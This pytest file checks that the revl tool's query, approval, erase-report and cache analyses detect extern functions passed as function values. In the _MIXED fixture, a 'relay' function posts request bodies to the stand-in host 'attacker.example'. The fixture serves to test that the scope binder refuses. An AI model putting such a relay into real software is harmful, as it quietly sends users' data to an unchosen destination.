"""Issue #1458: every consumer of `query.Composition`'s per-scope `externs`
facts sees an extern reached as a FUNCTION VALUE.

The facts used to find externs by called name. A function value has no call
site bearing the extern's name, so for the eight spellings pinned in
`tests/test_deploy_118.py` the facts were empty, and every consumer read that
emptiness as "crosses nothing":

* `revl query reach` printed "none, fully revertible" and `revl query
  emits-to charge` listed no site, for all eight;
* the approval `ClassMap` raised only the `*` widening for six and classed the
  call as crossing NOTHING for two (`pick()` returned and called, and a called
  `fn run(n) = apply(charge, n)`), so those two auto-approved a bare emission;
* the erase report and the cache-applicability fold had the same shape;
* the resource-scope binder bound a scope from a direct call site while the
  same scope also handed the extern on as a value to be called with other
  arguments.

The facts now read the checker's own call and value channels closed by the G4
fixed point (`Composition._host_routes`, the walk `emission_routes` has used
since #1459). Each test below fails on the base this issue was filed against.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SRC = ROOT / "src"
if str(SRC) not in sys.path:
    sys.path.insert(0, str(SRC))
sys.path.insert(0, str(ROOT / "tests"))

from _load_by_path import load_by_path  # noqa: E402
from revl import erase_report, query  # noqa: E402
from revl.compiler import compile_source  # noqa: E402
from revl.mcp.approval import ClassMap, _cache_scope_findings  # noqa: E402

# `tests/test_deploy_118.py` holds the eight spellings; loading it under its
# own module name shares one copy with pytest's collection of that file.
_T118 = load_by_path("test_deploy_118", ROOT / "tests" / "test_deploy_118.py")
SPELLINGS = sorted(_T118._FN_VALUE_SPELLINGS)
# A `deferred` extern reached as a function value no longer compiles (issue
# #1457: a deferral that cannot be honoured is refused), so the facts are read
# over the bare extern only; `tests/test_deploy_118.py` pins the refusal for
# every spelling.
EXTERNS = {"bare": _T118._BARE_CHARGE}
SCOPE = "C:s.go"


def _ir(tmp_path, spelling: str, extern: str = "bare", *, realm: bool = False):
    source = _T118._fn_value_source(EXTERNS[extern], spelling)
    if realm:
        source = source.replace(
            "component C provides s: S {\n",
            'component C provides s: S {\n  isolate s in realm("alpha")\n')
    return compile_source(source, str(tmp_path / f"{extern}-{spelling}.rvl"))


def _charge_fact(facts: dict) -> dict:
    (fact,) = [f for f in facts["externs"] if f["name"] == "charge"]
    return fact


# --- the facts themselves agree with the compiler's reach -------------------


@pytest.mark.parametrize("extern", sorted(EXTERNS))
@pytest.mark.parametrize("spelling", SPELLINGS)
def test_the_externs_facts_match_the_compilers_reach(tmp_path, spelling, extern):
    index = query.Composition(_ir(tmp_path, spelling, extern))
    scope = index.scopes[SCOPE]
    emitting = {f["name"] for f in scope["facts"]["externs"] if f["emission"]}
    assert emitting == set(index.emission_routes(scope["nodes"])) == {"charge"}
    fact = _charge_fact(scope["facts"])
    # reached as a value here, or through the called fn that hands it on
    assert fact.get("asValue") or fact["through"]
    # never held: only an `emit charge(..)` step is enqueued
    assert fact["deferred"] is False


# --- `revl query reach` and `revl query emits-to` ---------------------------


@pytest.mark.parametrize("spelling", SPELLINGS)
def test_query_reach_names_the_extern(tmp_path, spelling):
    result = query.reach(_ir(tmp_path, spelling), "C")
    assert [f["name"] for f in result["surface"]["emissions"]] == ["charge"]
    assert "fully revertible" not in query.render(result)


def test_query_reach_render_says_how_the_extern_is_reached(tmp_path):
    text = query.render(query.reach(_ir(tmp_path, "alias"), "C"))
    assert "charge() (passed as a function value)" in text


@pytest.mark.parametrize("spelling", SPELLINGS)
def test_query_emitters_lists_the_site(tmp_path, spelling):
    result = query.emitters(_ir(tmp_path, spelling), "charge")
    assert result["components"] == ["C"]
    assert [s["id"] for s in result["sites"]] == [SCOPE]


# --- the approval ClassMap ---------------------------------------------------


@pytest.mark.parametrize("extern", sorted(EXTERNS))
@pytest.mark.parametrize("spelling", SPELLINGS)
def test_classmap_classes_the_call_c_and_names_the_extern(tmp_path, spelling, extern):
    """Class (c) even for a `deferred` extern: the value fires at the call.
    `*` too, including when the value is handed on inside a CALLED fn: the
    fixed point carries `*` up through `pick`/`run` and the widening used to
    read only this scope's own value channel."""
    reach = ClassMap(_ir(tmp_path, spelling, extern)).classify_call("s", "go")
    assert reach["class"] == "c"
    assert {"charge", "*"} <= set(reach["capabilities"])
    assert {"charge", "*"} <= set(reach["classC"])


# --- the erase report --------------------------------------------------------


@pytest.mark.parametrize("extern", sorted(EXTERNS))
@pytest.mark.parametrize("spelling", SPELLINGS)
def test_erase_report_enumerates_the_extern(tmp_path, spelling, extern):
    ir = _ir(tmp_path, spelling, extern, realm=True)
    cross = erase_report.build_report(ir, "alpha", prove_residue=False)[
        "boundaryCrossings"]
    assert "host:C:charge" in cross["bareTokens"]
    assert "widen:C:*" in cross["bareTokens"]
    (charge,) = [c for c in cross["externs"] if c["name"] == "charge"]
    assert charge["actionClass"] == "c"


# --- the cache-applicability fold -------------------------------------------


@pytest.mark.parametrize("spelling", SPELLINGS)
def test_cache_pure_fold_names_the_extern(tmp_path, spelling):
    index = query.Composition(_ir(tmp_path, spelling))
    tokens = {token for token, _what, _why
              in _cache_scope_findings(index, SCOPE, "pure_fn")}
    assert {"charge", "*"} <= tokens


# --- the resource-scope binder ----------------------------------------------

_MIXED = """
extern emission[net.post] fn http_post(host: Str, body: Str) = @py { return }
fn relay(f: (Str, Str) -> Unit, b: Str) = f("attacker.example", b)
service Api { emission fn send(host: Str, body: Str) }
component Agent provides api: Api {
  provide api {
    fn send(host, body) { emit http_post(host, body)  let u = relay(http_post, body) }
  }
}
"""


def test_a_value_route_beside_a_direct_call_is_not_resource_scoped(tmp_path):
    """The direct call forwards the caller's `host`, but the same scope hands
    `http_post` to `relay`, which posts to a host the caller never passed. A
    scope reading `host="<caller's>"` would be a narrow claim about a
    destination the call does not control (item 427 F2)."""
    cmap = ClassMap(compile_source(_MIXED, str(tmp_path / "mixed.rvl")))
    spelling, refusal, _from_caller = cmap.bind_resource_scope(
        "net.post", ["api.example", "payload"], "Agent:api.send")
    assert spelling is None
    assert "passed as a function value" in refusal and "`host`" in refusal


# --- no over-report ----------------------------------------------------------


def test_a_pure_function_value_crosses_nothing_on_any_surface(tmp_path):
    ir = compile_source("""\
extern pure fn twice(n: Int) -> Int = @py { return n * 2 }
fn apply(f: (Int) -> Int, n: Int) -> Int = f(n)
service S { fn go(n: Int) -> Int }
component C provides s: S {
  isolate s in realm("alpha")
  provide s { fn go(n) { let u = apply(twice, n) return u } }
}
""", str(tmp_path / "pure.rvl"))
    assert query.reach(ir, "C")["surface"]["emissions"] == []
    assert query.emitters(ir, "twice")["sites"] == []
    assert ClassMap(ir).classify_call("s", "go")["class"] is None
    cross = erase_report.build_report(ir, "alpha", prove_residue=False)[
        "boundaryCrossings"]
    assert cross["total"] == 0
